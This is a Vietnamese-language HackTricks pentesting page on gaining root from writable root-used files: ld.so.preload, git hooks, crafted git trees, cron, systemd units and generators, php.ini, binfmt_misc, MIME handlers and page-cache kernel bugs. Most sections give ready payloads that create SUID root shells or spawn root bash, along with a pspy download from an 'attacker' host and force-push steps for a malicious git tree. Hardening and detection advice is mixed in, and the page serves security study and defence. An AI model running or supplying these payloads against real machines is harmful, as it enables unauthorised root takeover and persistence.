# Ghi tùy ý vào tệp của root

{{#include ../../banners/hacktricks-training.md}}

### /etc/ld.so.preload

`/etc/ld.so.preload` là danh sách toàn hệ thống các shared object mà dynamic linker tải trước những shared object khác. Chế độ thực thi an toàn áp dụng thêm các hạn chế đối với việc preload, vì vậy đường dẫn thư viện như `/tmp/pe.so` không phải là kỹ thuật phổ quát cho SUID binary.\
Nếu bạn có thể tạo hoặc sửa đổi tệp này, một tiến trình tải tệp sẽ tải thư viện được liệt kê trước các shared object khác, cho phép thực thi mã trong ngữ cảnh của tiến trình đó.<sup>[[12]](#references)</sup>

Ví dụ: `echo "/tmp/pe.so" > /etc/ld.so.preload`

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
    unlink("/etc/ld.so.preload");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
//cd /tmp
//gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```

### Đầu ra OCR dưới dạng primitive ghi file có giới hạn

Một dịch vụ OCR cho phép người gọi chọn tên file được lưu có thể biến văn bản nhận dạng từ ảnh thành một primitive **ghi file có giới hạn**. Các byte được lưu là văn bản đã nhận dạng, không phải byte của ảnh, vì vậy hãy kiểm tra đầu ra OCR để phát hiện lỗi cú pháp. Nếu đích được phép có thể thực thi trên web và chấp nhận tên file `.php`, văn bản đó có thể chạy khi được truy cập. Trong MakeSense, một ứng dụng OCR có thể truy cập cục bộ đã lưu văn bản trong `/saved/`; sau đó, máy chủ PHP chạy bằng root thực thi file đã lưu với quyền root. Thao tác ghi bị giới hạn trong thư mục đó, không có bằng chứng về path traversal.<sup>[[37]](#references)</sup>

Quyền có được khi thực thi là quyền của **tiến trình phục vụ PHP**, không tự động là quyền của tiến trình OCR ghi file. Hãy xác nhận ánh xạ thực thi của đích và danh tính runtime; tiến trình OCR ghi file bằng root kết hợp với web server không có đặc quyền sẽ không khiến PHP chạy bằng root.<sup>[[37]](#references)</sup> So sánh với [mẫu tải lên trực tiếp vào web-root](../../pentesting-web/file-upload/).

### Git hooks

**Git hooks** là các script có thể thực thi, được chạy khi xảy ra các sự kiện trong repository, bao gồm thao tác commit và merge. Nếu một **script hoặc người dùng có đặc quyền** thực hiện những thao tác đó và attacker có thể **ghi vào thư mục `.git`**, hook có thể được dùng để **privilege escalation**.<sup>[[13]](#references)</sup>

Ví dụ, có thể **tạo một script** trong git repo tại **`.git/hooks`** để script luôn được thực thi khi tạo commit mới:

```bash
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/0xdf' > pre-commit
chmod +x pre-commit
```

### Path traversal khi export Git tree với quyền đặc quyền

Một trình đồng bộ chạy với quyền cao có thể không thực hiện checkout mà thay vào đó liệt kê repository chịu ảnh hưởng của attacker bằng `git ls-tree`, đọc từng blob bằng `git cat-file`, nối pathname được báo cáo với thư mục staging rồi tự ghi file. Điều này trở thành **arbitrary file write với quyền của trình đồng bộ** khi nó kết hợp `-c safe.directory=*` (vô hiệu hóa cơ chế bảo vệ repository thuộc về người dùng khác của Git) với việc không kiểm tra đích ghi có nằm trong thư mục cho phép hay không. Tên entry tuyệt đối trong tree khiến Python's `os.path.join(stage, name)` bỏ qua `stage`; tên tương đối chứa `../` sẽ thoát khỏi thư mục khi filesystem phân giải đường dẫn. Vì ứng dụng materialize raw tree thay vì yêu cầu Git checkout, cơ chế từ chối pathname trong quá trình checkout không bảo vệ được sink.<sup>[[30]](#references)[[32]](#references)[[33]](#references)</sup>

Hãy tìm dạng code này trong các dịch vụ chạy bằng root, timer, agent triển khai, trình nhập template và tác vụ backup/restore:<sup>[[30]](#references)</sup>

```python
entries = git("-c", "safe.directory=*", "ls-tree", "-rz", "HEAD")
for mode, oid, git_path in parse(entries):
    target = os.path.join(stage_root, git_path)  # no containment check
    os.makedirs(os.path.dirname(target), exist_ok=True)
    with open(target, "wb") as output:
        output.write(git("cat-file", "blob", oid))
```

Một mục tree được mã hóa dưới dạng `<mode> SP <name> NUL <raw object ID>`. Tùy chọn `git hash-object --literally` cố ý cho phép dữ liệu object mà quá trình phân tích thông thường hoặc `git fsck` có thể từ chối, vì vậy một clone dùng để thử nghiệm có thể tạo một tree với tên tệp là đường dẫn đích tuyệt đối. Ví dụ này tạo một blob chứa tệp cron, bọc tree đã tạo trong một commit và di chuyển một branch đến đó; tuy nhiên, để khai thác thành công, vẫn cần có quyền cập nhật một repository được job đặc quyền sử dụng và một Git server chấp nhận object sai định dạng.<sup>[[30]](#references)[[31]](#references)</sup>

```bash
blob=$(printf '%s\n' '* * * * * root cp /bin/bash /tmp/rootbash && chmod 6755 /tmp/rootbash' | git hash-object -w --stdin)
{ printf '100644 /etc/cron.d/git-sync\0'; printf '%s' "$blob" | xxd -r -p; } > tree.raw
tree=$(git hash-object -w -t tree --literally --stdin < tree.raw)
commit=$(printf 'crafted tree\n' | git commit-tree "$tree")
git update-ref refs/heads/main "$commit"
git ls-tree -r main
git push --force origin main
```

Việc hardening phải bao gồm cả khâu tiếp nhận repository lẫn thao tác cuối cùng trên filesystem:<sup>[[30]](#references)[[33]](#references)[[34]](#references)</sup>

- Thay `safe.directory=*` bằng đúng các repository mà dịch vụ cần tin cậy, và nếu có thể, hãy xử lý repository mà không dùng quyền root.
- Từ chối tên đường dẫn tuyệt đối và mọi thành phần `.` hoặc `..` trước khi tạo file. Sau khi ghép đường dẫn, hãy canonicalize và xác minh đích vẫn nằm bên dưới thư mục gốc dự kiến.
- Tránh race condition symlink kiểu kiểm tra rồi mở: mở đường dẫn tương đối với file descriptor của thư mục đáng tin cậy; trên Linux, dùng `openat2()` với `RESOLVE_BENEATH` cùng `RESOLVE_NO_SYMLINKS` cho các đường dẫn do attacker kiểm soát.
- Ưu tiên checkout thông thường trong một thư mục cô lập thay vì tự triển khai lại checkout từ đầu ra plumbing. Nếu bắt buộc phải tiếp nhận raw object, hãy bật xác thực phía nhận như `receive.fsckObjects=true`; không hạ mức các phát hiện `receive.fsck.*` liên quan đến pathname cần thiết để từ chối tree được tạo có chủ đích.

### Triển khai cấu hình với quyền cao

Một số dịch vụ quản lý lưu trạng thái hệ thống dự kiến trong file cấu hình rồi triển khai sau bằng quyền cao. Ví dụ, [openmediavault lưu cấu hình trong `/etc/openmediavault/config.xml`](https://docs.openmediavault.org/en/7.x/faq.html), và [giao diện RPC](https://docs.openmediavault.org/en/8.x/development/tools/omv_rpc.html) của dịch vụ có thể áp dụng các thay đổi dịch vụ. Nếu tài khoản ít quyền có thể ghi hoặc thay thế file đó, hãy kiểm tra xem tài khoản này có thể yêu cầu triển khai được cấp quyền hay không, và module được chọn có sử dụng trường đã thay đổi với quyền root hay không. SSH account key, lệnh được lập lịch và cài đặt package đều có các điều kiện tiên quyết khác nhau; chỉ việc file tồn tại hoặc file XML có thể ghi không chứng minh được bất kỳ điều nào trong số đó. Hãy kiểm tra quyền của file và thư mục cha, các group của caller và quyền RPC, phiên bản đã cài đặt, cùng thành phần thực sự sử dụng cấu hình; không chỉnh sửa cấu hình hoặc gọi thao tác áp dụng trong quá trình liệt kê.

Các định nghĩa action của Fail2Ban trong `/etc/fail2ban/action.d/` là một ranh giới cấu hình đặc quyền khác. Người dùng có thể ghi và truy cập thư mục này có thể thay thế định nghĩa action hoặc thêm override, nhưng chỉ quyền của thư mục không đủ để khẳng định có thể thực thi code. Hãy xác nhận jail đang bật thực sự chọn action bị ảnh hưởng, dịch vụ Fail2Ban thực thi action đó với quyền cao hơn, và sẽ có thao tác reload/restart được cấp quyền cùng một sự kiện ban phù hợp. Quyền sudo không liên quan để restart Fail2Ban chỉ có ý nghĩa khi áp dụng cho đúng lệnh gọi dịch vụ và định nghĩa đã thay đổi được nạp. [Cấu hình action của Fail2Ban](https://github.com/fail2ban/fail2ban/blob/master/man/jail.conf.5) mô tả mối liên hệ giữa thư mục action và jail; [action mẫu](https://github.com/fail2ban/fail2ban/blob/master/config/action.d/iptables.conf) cho thấy `actionban` chạy khi có ban với quyền của người dùng dịch vụ. Hãy kiểm tra quyền và cấu hình hiệu lực mà không thay đổi action hoặc kích hoạt ban trong quá trình liệt kê.

Một ranh giới riêng tồn tại khi jail Fail2Ban đang bật sử dụng mail action có bổ sung thông tin WHOIS. [CVE-2021-32749](https://github.com/fail2ban/fail2ban/security/advisories/GHSA-m985-3f3v-cwmm) liên quan đến văn bản WHOIS không đáng tin cậy được chuyển qua GNU mailutils `mail`, nơi xử lý escape có thể thực thi lệnh. Người dùng ít quyền có thể ảnh hưởng đến phản hồi nếu họ có thể thay đổi cấu hình ghi đè server của **WHOIS client được chọn**; [`whois.conf(5)` của Debian](https://manpages.debian.org/bookworm/whois/whois.conf.5.en.html) mô tả một file như vậy, nhưng đường dẫn và cách sử dụng thay đổi tùy theo bản cài đặt. Hãy kiểm tra jail/action hiệu lực, danh tính dịch vụ, WHOIS client thực tế và đường dẫn cấu hình, mail implementation, khả năng kiểm soát phản hồi, cùng bản sửa lỗi hoặc backport của nhà cung cấp đã cài đặt. Chỉ một file cấu hình WHOIS có thể ghi, một phiên bản Fail2Ban hoặc một mail action không chứng minh được toàn bộ chuỗi này; tránh truy vấn server bên ngoài hoặc kích hoạt ban trong quá trình liệt kê thụ động.

### Tạo file qua TFTP và hook package đặc quyền

Một dịch vụ TFTP có thể truy cập được có khả năng vượt qua ranh giới container hoặc người dùng cục bộ khi các cài đặt tftpd-hpa **hiệu lực** chạy với quyền root, đặt filesystem root làm thư mục `--secure` và bật `--create`. [Tài liệu hướng dẫn tftpd-hpa](https://manpages.debian.org/trixie/tftpd-hpa/tftpd.8.en.html) mô tả các tùy chọn tạo file và người dùng. Đây là một hướng có thể tạo file mới trong thư mục cấu hình đặc quyền, chẳng hạn `/etc/apt/apt.conf.d/`; file đã tồn tại vẫn có thể không bị thay thế. [Tài liệu cấu hình của APT](https://manpages.debian.org/bookworm/apt/apt.conf.5.en.html) mô tả các lệnh `APT::Update::Pre-Invoke`. Lệnh `apt update` chạy với quyền root chỉ có thể trở thành thành phần sử dụng với quyền cao hơn **nếu** nó đọc file cấu hình mới. Hãy xác nhận tham số và danh tính thực tế của daemon đang chạy, khả năng truy cập mạng và các quy tắc lọc, chính sách tạo file của thư mục đích, phạm vi cấu hình hiệu lực của APT và lần gọi đặc quyền tiếp theo. Chỉ một file mặc định, thư mục đích có thể ghi hoặc lệnh APT được lập lịch không chứng minh được toàn bộ đường dẫn. Phân loại thụ động chỉ nên đọc cấu hình cục bộ có giới hạn và metadata, không tải file lên hoặc gọi APT.

### File Cron và Time

Nếu bạn có thể **ghi các file liên quan đến cron mà root thực thi**, thường bạn có thể thực thi code vào lần tiếp theo job chạy. Các đích đáng chú ý gồm:<sup>[[14]](#references)[[20]](#references)</sup>

- `/etc/crontab`
- `/etc/cron.d/*`
- `/etc/cron.hourly/*`, `/etc/cron.daily/*`, `/etc/cron.weekly/*`, `/etc/cron.monthly/*`
- Crontab riêng của root trong `/var/spool/cron/` hoặc `/var/spool/cron/crontabs/`
- Timer `systemd` và các service mà chúng kích hoạt

Kiểm tra nhanh:

```bash
ls -la /etc/crontab /etc/cron.d /etc/cron.hourly /etc/cron.daily /etc/cron.weekly /etc/cron.monthly 2>/dev/null
find /var/spool/cron* -maxdepth 2 -type f -ls 2>/dev/null
systemctl list-timers --all 2>/dev/null
grep -R "run-parts\\|cron" /etc/crontab /etc/cron.* /etc/cron.d 2>/dev/null
```

Các đường khai thác thường gặp:

- **Thêm một cron job mới chạy với quyền root** vào `/etc/crontab` hoặc một tệp trong `/etc/cron.d/`
- **Thay thế một script** đã được `run-parts` thực thi
- **Cài backdoor vào một timer target hiện có** bằng cách chỉnh sửa script hoặc binary mà nó chạy

Ví dụ payload cron tối giản:

```bash
echo '* * * * * root cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash' >> /etc/crontab
```

Nếu bạn chỉ có thể ghi vào thư mục cron được `run-parts` sử dụng, hãy đặt một tệp có quyền thực thi vào đó thay vào đó:

```bash
cat > /etc/cron.daily/backup <<'EOF'
#!/bin/sh
cp /bin/bash /tmp/rootbash
chown root:root /tmp/rootbash
chmod 4777 /tmp/rootbash
EOF
chmod +x /etc/cron.daily/backup
```

Ghi chú:

- `run-parts` thường bỏ qua các tên tệp có dấu chấm, vì vậy hãy ưu tiên các tên như `backup` thay vì `backup.sh`.<sup>[[15]](#references)</sup>
- Một số hệ thống dùng timer `systemd` thay cho cron truyền thống, nhưng cách khai thác vẫn như nhau: **sửa những gì root sẽ thực thi sau đó**.<sup>[[20]](#references)</sup>

### Tệp Service & Socket

Nếu bạn có thể ghi vào **các unit file của `systemd`** hoặc các tệp được chúng tham chiếu, bạn có thể thực thi code với quyền root bằng cách tải lại và khởi động lại unit, hoặc chờ cơ chế kích hoạt service/socket được kích hoạt.<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)</sup>

Ngoài ra, hãy kiểm tra quyền ghi và quyền tìm kiếm đối với chính thư mục unit của hệ thống, bao gồm cả ACL: người dùng có thể tạo unit mới trong `/etc/systemd/system` ngay cả khi không được phép đọc/liệt kê thư mục. Chỉ riêng việc có quyền trên đường dẫn đó không làm cho bất cứ thứ gì khởi chạy. Hãy xác nhận system manager sẽ tải unit mới, người gọi có quyền `systemctl start` hoặc `restart` hiệu lực đủ để thực thi với quyền root đối với tên unit đó (hoặc có một đường kích hoạt đặc quyền khác), và service chạy với danh tính mong muốn. Một unit hiện có đã được tải nhưng bị sửa trên đĩa có thể cần `daemon-reload`; unit có tên mới có cơ chế tải khác. Hãy xem xét chính xác các đối số và ngoại lệ của sudo trước khi coi quy tắc restart dùng wildcard là đủ. Xem [đường dẫn tìm kiếm unit của systemd](https://www.freedesktop.org/software/systemd/man/latest/systemd.unit.html) và [cơ chế tải và ngữ nghĩa reload của systemctl](https://www.freedesktop.org/software/systemd/man/latest/systemctl.html).

Các mục tiêu đáng chú ý gồm:

- `/etc/systemd/system/*.service`
- `/etc/systemd/system/*.socket`
- Các override dạng drop-in trong `/etc/systemd/system/<unit>.d/*.conf`
- Các script/binary của service được tham chiếu bởi `ExecStart=`, `ExecStartPre=`, `ExecStartPost=`
- Các đường dẫn `EnvironmentFile=` có thể ghi, được service chạy với quyền root tải

Kiểm tra nhanh:

```bash
ls -la /etc/systemd/system /lib/systemd/system /usr/lib/systemd/system 2>/dev/null
systemctl list-units --type=service --all 2>/dev/null
systemctl list-units --type=socket --all 2>/dev/null
grep -R "^ExecStart=\\|^EnvironmentFile=\\|^ListenStream=" /etc/systemd/system /lib/systemd/system /usr/lib/systemd/system 2>/dev/null
```

Các đường lạm dụng phổ biến:

- **Ghi đè `ExecStart=`** trong unit dịch vụ thuộc sở hữu của root mà bạn có thể chỉnh sửa
- **Thêm drop-in override** chứa `ExecStart=` độc hại và xóa giá trị cũ trước
- **Cài backdoor vào script/binary** đã được unit tham chiếu
- **Chiếm quyền điều khiển dịch vụ được kích hoạt qua socket** bằng cách chỉnh sửa file `.service` tương ứng, vốn được khởi chạy khi socket nhận kết nối

Ví dụ về override độc hại:

```ini
[Service]
ExecStart=
ExecStart=/bin/sh -c 'cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash'
```

Luồng kích hoạt điển hình:

```bash
systemctl daemon-reload
systemctl restart vulnerable.service
# or trigger the socket-backed service by connecting to it
```

Nếu bạn không thể tự khởi động lại dịch vụ nhưng có thể chỉnh sửa một unit được kích hoạt bằng socket, bạn có thể chỉ cần **chờ một kết nối từ client** để kích hoạt việc chạy dịch vụ đã bị cài backdoor với quyền root.<sup>[[17]](#references)</sup>

### Các thư mục systemd generator

**System generators** là các tệp thực thi được system manager khởi chạy trước khi tải các unit file, cả khi khởi động lẫn khi tải lại cấu hình. Vì vậy, quyền ghi vào một thư mục system-generator (hoặc vào một generator thực thi hiện có) là một primitive thực thi mã trực tiếp với quyền root, rất dễ bị bỏ sót nếu quá trình kiểm tra chỉ xem xét các tệp `*.service` và `*.timer`.<sup>[[35]](#references)[[36]](#references)</sup>

Thứ tự tìm kiếm thông thường là `/run/systemd/system-generators/`, `/etc/systemd/system-generators/`, `/usr/local/lib/systemd/system-generators/` và `/usr/lib/systemd/system-generators/` (một số bản phân phối cung cấp `/lib/systemd/system-generators/` thông qua việc hợp nhất `/usr`). Một tệp thực thi cùng tên trong thư mục đứng trước sẽ che khuất tệp trong thư mục đứng sau. Đừng nhầm các **thư mục tệp thực thi đầu vào** này với `/run/systemd/generator`, `/run/systemd/generator.early` và `/run/systemd/generator.late`, nơi chứa đầu ra unit tạm thời do các generator tạo ra.<sup>[[35]](#references)</sup>

Kiểm tra nhanh:

```bash
for d in /run/systemd/system-generators /etc/systemd/system-generators \
         /usr/local/lib/systemd/system-generators /usr/lib/systemd/system-generators \
         /lib/systemd/system-generators; do
    [ -e "$d" ] || continue
    namei -l "$d"
    find "$d" -maxdepth 1 -writable -ls 2>/dev/null
    getfacl -p "$d" "$d"/* 2>/dev/null
done
```

Một generator mới được tạo phải được bật bit thực thi. Nếu primitive ghi chỉ kiểm soát các byte mà không kiểm soát mode, hãy nhắm đến một generator đã có quyền thực thi; việc cắt ngắn nó ngay tại chỗ thường giữ nguyên metadata. Nếu chính thư mục có quyền ghi, hãy tạo một mục mới và đánh dấu mục đó có quyền thực thi.<sup>[[35]](#references)</sup>

```bash
cat > /etc/systemd/system-generators/zz-update <<'EOF'
#!/bin/sh
cp /bin/bash /tmp/rootbash
chown 0:0 /tmp/rootbash
chmod 4755 /tmp/rootbash
rm -f "$0"
EOF
chmod 755 /etc/systemd/system-generators/zz-update
```

Kích hoạt `systemctl daemon-reload` trên manager **system** cần quyền phù hợp, nhưng thao tác này chạy lại mọi system generator; nếu không, hãy chờ một lần reload, thao tác package hoặc khởi động lại có quyền cao. Các thư mục user-generator như `~/.config/systemd/user-generators/` chạy trong user manager và **không tự cấp quyền root**.<sup>[[35]](#references)</sup>

Để hardening và hunting, hãy xác minh mọi thành phần đường dẫn và ACL, thay vì chỉ kiểm tra các bit mode cuối cùng; tạo baseline hash/ownership của package cho các generator, đồng thời cảnh báo khi có thao tác tạo, đổi tên, thay đổi nội dung hoặc quyền trong mọi thư mục đầu vào của system-generator. Việc giám sát thao tác ghi rất quan trọng vì generator chạy một lần có thể tự xóa sau khi thực thi, trong khi cây unit được tạo bên dưới `/run/systemd/generator*` sẽ được dựng lại ở lần reload tiếp theo.<sup>[[35]](#references)[[36]](#references)</sup>

### Ghi đè `php.ini` hạn chế được một PHP sandbox có quyền cao sử dụng

Một số daemon tùy chỉnh xác thực PHP do người dùng cung cấp bằng cách chạy `php` với **`php.ini` bị hạn chế** (ví dụ: `disable_functions=exec,system,...`). Nếu code trong sandbox vẫn có **bất kỳ primitive ghi nào** (như `file_put_contents`) và bạn có thể truy cập **đúng đường dẫn `php.ini`** mà daemon sử dụng, bạn có thể **ghi đè cấu hình đó** để gỡ bỏ các hạn chế, rồi gửi payload thứ hai chạy với quyền cao hơn.<sup>[[2]](#references)</sup>

Quy trình điển hình:

1. Payload đầu tiên ghi đè cấu hình sandbox.
2. Payload thứ hai thực thi code sau khi các hàm nguy hiểm được bật lại.

Ví dụ tối giản (thay bằng đường dẫn daemon sử dụng):

```php
<?php
file_put_contents('/path/to/sandbox/php.ini', "disable_functions=\n");
```

Nếu daemon chạy với quyền root (hoặc xác thực bằng các đường dẫn do root sở hữu), lần thực thi thứ hai sẽ có ngữ cảnh root. Đây về cơ bản là **privilege escalation via config overwrite** khi runtime bị sandbox vẫn có thể ghi file.

### binfmt_misc

`binfmt_misc` cung cấp các đăng ký tại `/proc/sys/fs/binfmt_misc`; mỗi đăng ký liên kết một mẫu loại file với một interpreter. Tác động đến quyền tùy thuộc vào ai có thể thay đổi đăng ký và tiến trình nào sau đó thực thi file khớp mẫu, vì vậy hãy xác minh các điều kiện này trước khi xem đây là một đường dẫn privilege escalation.<sup>[[21]](#references)</sup>

Một helper thực thi có `CAP_DAC_OVERRIDE` có thể tạo ra một đường đăng ký riêng nếu nó nhận dữ liệu do người gọi kiểm soát và ghi dữ liệu đó vào `/proc/sys/fs/binfmt_misc/register`, ngay cả khi người gọi không thể ghi trực tiếp vào node này. Hãy xem xét cách helper xử lý đầu vào và ghi dữ liệu mà không thực thi nó trong quá trình liệt kê. Nếu một quy tắc đã đăng ký sử dụng cờ `C`, interpreter sẽ nhận thông tin xác thực dựa trên binary khớp mẫu; do đó, một file SUID thuộc sở hữu của root có thể chạy một interpreter do người gọi kiểm soát với quyền root. Hãy xác nhận mount và chính sách đăng ký `binfmt_misc`, capability hiệu lực của helper, quy tắc chính xác và đường dẫn interpreter, mục tiêu SUID có thể thực thi, và liệu `no_new_privs` hoặc mount `nosuid` có ngăn chuyển đổi SUID hay không. Chỉ riêng bit capability hoặc chuỗi đường dẫn nhúng trong file chỉ là manh mối cần xem xét.<sup>[[21]](#references)</sup> Xem [execve(2)](https://man7.org/linux/man-pages/man2/execve.2.html) để biết các điều kiện ngăn SUID có hiệu lực.

### Ghi đè trình xử lý schema (như http: hoặc https:)

Môi trường desktop sử dụng các liên kết MIME và mục desktop để chọn ứng dụng xử lý URI scheme; kẻ tấn công có thể ghi vào các thư mục cấu hình theo người dùng và thư mục mục desktop liên quan có thể chuyển hướng các scheme đó đến một launcher do chúng kiểm soát. Bằng cách sửa file `$HOME/.config/mimeapps.list` để trỏ trình xử lý URL HTTP và HTTPS đến một file độc hại (ví dụ: `x-scheme-handler/http=evil.desktop` và `x-scheme-handler/https=evil.desktop`), một cú nhấp chuột của người dùng có thể kích hoạt mục desktop đó.<sup>[[22]](#references)[[23]](#references)[[24]](#references)</sup>

```bash
[Desktop Entry]
Type=Application
Name=Evil Desktop Entry
Exec=/bin/sh -c "id > /tmp/mime-handler-pwned"
MimeType=x-scheme-handler/http;x-scheme-handler/https;
```

### Root thực thi scripts/binaries mà user có thể ghi

Nếu một workflow có đặc quyền chạy lệnh như `/bin/sh /home/username/.../script` (hoặc bất kỳ binary nào bên trong thư mục thuộc sở hữu của user không có đặc quyền), bạn có thể chiếm quyền điều khiển nó:<sup>[[1]](#references)</sup>

- **Phát hiện quá trình thực thi:** giám sát các tiến trình bằng pspy để bắt quả tang root gọi các đường dẫn do user kiểm soát.<sup>[[25]](#references)</sup>

```bash
wget http://attacker/pspy64 -O /dev/shm/pspy64
chmod +x /dev/shm/pspy64
/dev/shm/pspy64   # wait for root commands pointing to your writable path
```

- **Xác nhận quyền ghi:** đảm bảo tệp mục tiêu và thư mục chứa nó thuộc sở hữu/có thể ghi bởi người dùng của bạn.
- **Chiếm quyền mục tiêu:** sao lưu binary/script gốc và thả payload tạo shell SUID (hoặc thực hiện hành động khác với quyền root), sau đó khôi phục quyền:

```bash
mv server-command server-command.bk
cat > server-command <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootshell
chown root:root /tmp/rootshell
chmod 6777 /tmp/rootshell
EOF
chmod +x server-command
```

- **Kích hoạt hành động có đặc quyền** (ví dụ: nhấn nút trên giao diện để khởi chạy helper). Khi root thực thi lại đường dẫn bị chiếm quyền, lấy shell đã leo thang đặc quyền bằng `./rootshell -p`.

### Sửa đổi binary có đặc quyền chỉ trong page cache

Một số lỗi kernel không sửa đổi file **trên đĩa**. Thay vào đó, chúng chỉ cho phép bạn sửa đổi **bản sao trong page cache** của một file có thể đọc. Nếu nhắm được vào một binary **setuid** hoặc được **root thực thi** theo cách khác, lần thực thi tiếp theo có thể chạy byte do attacker kiểm soát từ bộ nhớ và leo thang đặc quyền, dù hash của file trên đĩa không đổi.<sup>[[3]](#references)[[4]](#references)</sup>

Có thể xem đây là một **primitive ghi file chỉ tồn tại trong runtime**:<sup>[[3]](#references)</sup>

- **Đĩa vẫn sạch**: inode và byte trên đĩa không thay đổi
- **Bộ nhớ bị thay đổi**: các process đọc/thực thi trang đã cache sẽ nhận nội dung do attacker sửa đổi
- **Tác động chỉ tạm thời**: thay đổi biến mất sau khi khởi động lại hoặc cache bị loại bỏ

Primitive này nằm giữa **ghi file tùy ý** kiểu cổ điển và các lỗi **lạm dụng page cache** trước đây như Dirty COW / Dirty Pipe:<sup>[[3]](#references)</sup>

- Dirty COW dựa vào race
- Dirty Pipe bị giới hạn vị trí ghi
- Primitive chỉ tác động lên page cache có thể đáng tin cậy hơn nếu đường xử lý dễ bị tấn công cho phép ghi trực tiếp vào các trang được hỗ trợ bởi file trong cache

#### Luồng privesc tổng quát

1. Có được một kernel primitive có thể ghi vào **các trang page cache được hỗ trợ bởi file**
2. Dùng nó lên một **binary có đặc quyền và có thể đọc được** hoặc file khác được root thực thi
3. Kích hoạt thực thi **trước khi trang bị loại khỏi cache**
4. Thực thi code với quyền root trong khi file trên đĩa vẫn có vẻ chưa bị sửa đổi

Các mục tiêu thường có giá trị cao:

- Binary **setuid-root**
- Helper được khởi chạy bởi **dịch vụ root**
- Các binary thường được thực thi từ **container dùng chung kernel/page cache với host**

#### Ví dụ đường tấn công AF_ALG + `splice()`

Copy Fail (CVE-2026-31431) là ví dụ điển hình của dạng này. Đường xử lý dễ bị tấn công nằm trong API crypto userspace của Linux (`AF_ALG` / `algif_aead`):<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[6]](#references)[[7]](#references)</sup>

- `splice()` có thể chuyển các tham chiếu đến trang page cache từ một file có thể đọc vào scatterlist TX của crypto
- Đường giải mã tại chỗ của `algif_aead` tái sử dụng buffer nguồn và đích
- Sau đó, `authencesn` ghi vào vùng tag của đích
- Khi vùng đó vẫn tham chiếu đến các trang của file trong cache được đưa vào bằng `splice()`, thao tác ghi sẽ tác động lên **page cache của file mục tiêu**

Vì vậy, kỹ thuật đáng chú ý không phải là bản thân CVE, mà là mẫu hình sau:

- **đưa các trang cache được hỗ trợ bởi file vào một subsystem kernel**
- khiến subsystem **xử lý chúng như đầu ra có thể ghi**
- kích hoạt một thao tác ghi đè nhỏ, có kiểm soát trong bộ nhớ

PoC công khai dùng nhiều lần thao tác **ghi 4 byte** để vá `/usr/bin/su` trong bộ nhớ rồi thực thi nó.<sup>[[4]](#references)[[7]](#references)</sup>

#### Ví dụ đường tấn công ESP / XFRM + netfilter TEE clone

DirtyClone (CVE-2026-43503) cho thấy một biến thể khác của cùng mẫu hình **ghi vào root chỉ thông qua page cache**, nhưng lần này điểm ghi là **giải mã IPsec ESP** thay vì `AF_ALG`.<sup>[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>

Kỹ thuật quan trọng là bước **làm sai lệch metadata**:

- `splice()` đặt một **trang page cache chỉ đọc được hỗ trợ bởi file** vào một gói ESP-in-UDP
- Biện pháp giảm thiểu DirtyFrag ban đầu gắn thẻ skb bằng `SKBFL_SHARED_FRAG` để `esp_input()` sẽ **sao chép trước khi giải mã**
- netfilter `TEE` nhân đôi gói qua `nf_dup_ipv4()` -> `__pskb_copy_fclone()`
- bản sao giữ lại **tham chiếu đến cùng một trang vật lý trong page cache** nhưng mất `SKBFL_SHARED_FRAG`
- sau đó, `esp_input()` xem bản sao là an toàn và chạy giải mã **`cbc(aes)` tại chỗ** trên trang được hỗ trợ bởi file

Bài học cho người đánh giá rộng hơn phạm vi CVE: nếu một biện pháp giảm thiểu dựa vào **metadata của skb/page** để quyết định có cần sao chép trước khi thực hiện thao tác hay không, thì bất kỳ **đường dẫn clone/copy nào giữ lại trang nền nhưng làm mất metadata** đều có thể âm thầm mở lại primitive ghi.

Luồng khai thác thường gặp:

1. `unshare(CLONE_NEWUSER | CLONE_NEWNET)` để có **`CAP_NET_ADMIN` bên trong network namespace riêng**
2. bật loopback và cài đặt quy tắc **netfilter `TEE`** trong `mangle/OUTPUT`
3. cài đặt các XFRM ESP transport SA qua `NETLINK_XFRM`
4. mã hóa từng word mục tiêu 4 byte vào trường `seq_hi` của SA (thủ thuật chọn word của DirtyFrag)
5. gửi gói ESP-in-UDP được đưa vào bằng `splice()` để **bản sao TEE** đến `esp_input()` và được giải mã **tại chỗ**
6. lặp lại cho đến khi bản sao trong page cache của `/usr/bin/su` hoặc một executable có đặc quyền khác chứa code do attacker kiểm soát

Về mặt vận hành, tác động giống ví dụ `AF_ALG`: file trên đĩa vẫn sạch, nhưng `execve()` sử dụng **các byte page cache đã bị sửa đổi** và mang lại quyền root.<sup>[[8]](#references)[[9]](#references)</sup>

Các bước kiểm tra mức độ phơi nhiễm hữu ích cho biến thể này:

```bash
unshare -Urn true 2>/dev/null && echo "user+net namespaces available"
sysctl kernel.apparmor_restrict_unprivileged_userns 2>/dev/null
modprobe -n -v xt_TEE 2>/dev/null
modprobe -n -v esp4 2>/dev/null
modprobe -n -v esp6 2>/dev/null
lsmod | egrep 'xt_TEE|nf_dup_ipv4|esp4|esp6|x_tables'
```

Việc giảm bề mặt tấn công ngắn hạn cũng phụ thuộc vào đường đi cụ thể: nâng cấp lên kernel có `48f6a5356a33` sẽ khắc phục đường đi clone, còn chặn tự động tải `xt_TEE` sẽ loại bỏ **bước rửa flag** và chặn `esp4` / `esp6` sẽ loại bỏ **điểm nhận giải mã**.<sup>[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>

#### Phơi nhiễm và truy tìm

Nếu nghi ngờ có lỗi thuộc loại này, đừng chỉ dựa vào việc kiểm tra tính toàn vẹn của đĩa. Hãy xác minh thêm:

```bash
uname -r
grep CONFIG_CRYPTO_USER_API_AEAD= /boot/config-$(uname -r) 2>/dev/null
lsmod | grep algif_aead
find / -perm -4000 -type f 2>/dev/null
```

